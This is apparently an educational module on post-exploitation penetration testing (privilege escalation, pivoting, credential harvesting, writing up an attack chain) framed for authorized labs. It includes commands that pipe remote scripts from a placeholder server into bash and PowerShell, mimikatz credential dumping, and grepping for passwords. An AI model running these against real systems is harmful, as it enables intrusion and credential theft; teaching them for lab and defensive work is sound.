# 01 · Advanced Penetration Testing

Level 2 Module 9 covered the standard pentest methodology end to end.
This module goes deeper into techniques used once initial access is
gained — lateral movement, privilege escalation, and pivoting — the
skills that separate "found one vulnerability" from "demonstrated the
real business impact of a breach chain," all against a legal, purpose-
built lab.

!!! warning "Authorized lab only"
    Everything here uses **HackTheBox/TryHackMe-style intentionally
    vulnerable machines** or a local multi-VM lab you control (e.g.
    Metasploitable2 plus a second pivot-target VM on an isolated
    host-only network). Never chain these techniques against real
    infrastructure without explicit written authorization.

## 1. Why chaining matters more than single findings

A single medium-severity misconfiguration is often dismissed. The same
misconfiguration as step one of a proven chain to full domain compromise
gets fixed immediately — this is the entire value proposition of advanced
pentesting over automated scanning: **proving realistic attack paths**,
not just listing isolated issues.

```
Low-priv web shell → local privilege escalation → credential harvest →
  lateral movement to a second host → repeat → domain admin
```

## 2. Privilege escalation — Linux

After gaining an initial low-privilege shell (e.g. via a web app RCE in a
lab), the next question is always "how do I become root/a more valuable
user":

```bash
# Automated enumeration -- run first, always
curl -s http://YOUR_HTTP_SERVER/linpeas.sh | bash

# Manual checks these scripts automate:
sudo -l                                    # what can this user sudo, without a password?
find / -perm -4000 -type f 2>/dev/null     # SUID binaries (recap: Level 2 Module 3)
cat /etc/crontab; ls -la /etc/cron.d/      # scheduled jobs running as root?
```

A classic finding: a cron job running as root that executes a
world-writable script — editing that script grants root on next run.
This is exactly the class of finding Level 2 Module 3's hardening
checklist exists to prevent.

## 3. Privilege escalation — Windows

```powershell
# Automated enumeration
IEX(New-Object Net.WebClient).DownloadString('http://YOUR_HTTP_SERVER/PowerUp.ps1')
Invoke-AllChecks

# Manual checks:
whoami /priv                       # dangerous privileges assigned to this token?
schtasks /query /fo LIST /v        # scheduled tasks, and what runs them
```

`SeImpersonatePrivilege` present on a service account, for example, is a
well-known path to SYSTEM via "potato"-family techniques — a finding
that's meaningless in isolation but critical as a chain step.

## 4. Lateral movement and pivoting

Once you control one host, a lab network often has other hosts only
reachable *from* that host (simulating a segmented internal network):

```bash
# Set up a pivot via SSH local/dynamic port forwarding
ssh -D 1080 user@compromised-host
# Route further tool traffic (nmap, curl) through the SOCKS proxy
proxychains nmap -sT -Pn 10.10.10.0/24
```

```bash
# Metasploit's built-in pivoting via a session's route
route add 10.10.10.0/24 1
```

This is the technical mechanism behind "the attacker got into a low-
value marketing server, and three hops later was in the finance
database" — a pattern found in real breach post-mortems, and exactly
why network segmentation (Level 4 Module 3) is a critical control.

## 5. Credential harvesting along the chain

```bash
# Linux: look for cleartext creds in config files, history, memory
grep -ri "password" /var/www/*/config* 2>/dev/null
cat ~/.bash_history

# Windows: dump credentials from memory (only in an authorized lab --
# this is exactly what Credential Guard, Level 2 Module 4, defends against)
mimikatz # sekurlsa::logonpasswords
```

Every credential found this way should be tested against *other* hosts in
the lab — password reuse across systems is one of the most common,
highest-impact real-world findings.

## 6. Documenting an attack chain

A chain-level finding is written differently than a single vulnerability:

```
Attack Path: Web Shell to Domain Compromise
Steps:
  1. RCE via unpatched CMS plugin (web-01) -> low-priv shell (www-data)
  2. World-writable root cron job (web-01) -> privilege escalation to root
  3. Cleartext DB credential in /var/www/config.php -> reused on db-01
  4. db-01 local admin password identical to workstation fleet (LAPS
     absent) -> lateral movement to fin-ws-04
  5. Cached domain admin credential on fin-ws-04 -> full domain compromise
Root causes: unpatched software, poor file permissions, credential reuse,
  no LAPS deployment, overprivileged cached credentials
Single-point fix that breaks the whole chain: any one of steps 2-5 --
  recommend prioritizing LAPS deployment (breaks step 4) as highest ROI
```

Identifying the **highest-leverage single fix** that breaks the whole
chain (rather than listing five equal-priority fixes) is the mark of a
senior-level pentest report.

## Key terms

| Term | Meaning |
|---|---|
| **Privilege escalation** | Gaining higher-level access than initially obtained |
| **Lateral movement** | Moving from one compromised host to another within a network |
| **Pivoting** | Using a compromised host as a relay to reach otherwise-unreachable networks |
| **Attack chain / kill chain** | The full sequence of steps from initial access to ultimate objective |
| **Password reuse** | Using the same credential across multiple systems/accounts |
| **SOCKS proxy** | A relay allowing arbitrary traffic to be routed through a compromised host |

## Exercise

1. In an isolated lab, gain an initial low-privilege shell on a vulnerable
   VM (reuse Metasploitable2 or a HackTheBox-style retired lab machine).
2. Run an automated enumeration script and identify at least one
   privilege escalation path; execute it and confirm root/SYSTEM.
3. Search the compromised host for any credentials in config files or
   history and note where they might be reused.
4. If your lab has a second VM, set up SSH pivoting and reach it from
   your first foothold.
5. Write a chain-level finding using the section 6 template, including
   identifying the single highest-leverage fix.
